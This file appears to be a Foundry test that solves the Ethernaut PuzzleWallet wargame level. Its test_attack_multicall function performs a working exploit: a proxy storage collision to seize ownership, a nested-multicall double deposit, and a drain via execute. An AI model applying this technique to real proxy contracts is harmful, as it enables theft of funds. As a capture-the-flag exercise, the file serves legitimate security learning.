// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";
import {Utils, Ethernaut, Level} from "@ethernaut/test/utils/Utils.sol";

import {PuzzleWallet, PuzzleProxy} from "@ethernaut/src/levels/PuzzleWallet.sol";
import {PuzzleWalletFactory} from "@ethernaut/src/levels/PuzzleWalletFactory.sol";
// import {Level} from "@ethernaut/src/levels/base/Level.sol";
// import {Ethernaut} from "@ethernaut/src/Ethernaut.sol";

contract TestPuzzleWallet is Test, Utils {
    /// forge-config: default.fuzz.runs = 5000
    /// forge-config: default.invariant.runs = 1000
    /// forge-config: default.invariant.depth = 20

    Ethernaut ethernaut;
    PuzzleWallet instance;
    PuzzleProxy proxy;

    address payable owner;
    address payable admin;
    address payable player;
    address unknown;

    uint256 public maxBalance;

    function setUp() public {
        address payable[] memory users = createUsers(3);
        owner = users[0];
        vm.label(owner, "Owner");
        admin = users[1];
        vm.label(owner, "Admin");
        player = users[2];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        PuzzleWalletFactory factory = new PuzzleWalletFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        address proxyAddress = createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether);
        proxy = PuzzleProxy(payable(proxyAddress));
        instance = PuzzleWallet(payable(proxy));
        vm.stopPrank();

        console.log("Wallet owner: %s", instance.owner());
        console.log("Proxy admin: %s", proxy.admin());
        console.log("Proxy pendingAdmin: %s", proxy.pendingAdmin());
        console.log("ADDR Owner: %s", owner);
        console.log("ADDR Admin: %s", admin);
        console.log("ADDR Player: %s", player);

        // invariant test values
        unknown = instance.owner(); //proxy.admin();
        maxBalance = instance.maxBalance();

        StdInvariant.targetSender(owner);
        StdInvariant.targetSender(admin);
        StdInvariant.targetSender(player);
    }

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    // function invariant_wallet_owner() external {
    //     // succesfully fails with [Sequence]
    //     // sender=0x0000000000000000000000000000000000001D26 addr=[lib/ethernaut/contracts/src/levels/PuzzleWallet.sol:PuzzleProxy]0x271f3aF86b654c205C493B7f6A92024D4294708e
    //     //    calldata=proposeNewAdmin(address) args=[0x00000000000000000000000000000000000012CB]
    //     assertEq(instance.owner(), unknown);
    // }

    // function invariant_wallet_whitelisted() external {
    //     proxy.proposeNewAdmin(player);
    //     vm.prank(player);
    //     instance.addToWhitelist(player);

    //     assertEq(instance.maxBalance(), maxBalance);
    // }

    function test_bypass_to_whitelist() external {
        vm.startPrank(player);
        vm.expectRevert("Not the owner");
        instance.addToWhitelist(player);

        proxy.proposeNewAdmin(player);
        instance.addToWhitelist(player);

        vm.stopPrank();
    }

    function test_attack_multicall() external {
        startHoax(player);
        proxy.proposeNewAdmin(player);
        instance.addToWhitelist(player);

        bytes[] memory calls = new bytes[](3);
        // calls[0] = abi.encodeWithSelector(instance.deposit.selector);
        // calls[1] = abi.encodeWithSelector(instance.deposit.selector);
        // vm.expectRevert("Deposit can only be called once");

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(instance.deposit.selector);

        calls[0] = abi.encodeWithSelector(instance.multicall.selector, depositSelector);
        // same as:
        // calls[0] =
        // hex"ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";
        console.logBytes(calls[0]);
        calls[1] = abi.encodeWithSelector(instance.deposit.selector);
        console.logBytes(calls[1]);
        calls[2] = abi.encodeWithSelector(instance.execute.selector, player, 0.002 ether, "");

        instance.multicall{value: 0.001 ether}(calls);

        instance.setMaxBalance(uint256(uint160(address(player))));

        assertEq(proxy.admin(), player);

        vm.stopPrank();
    }
}
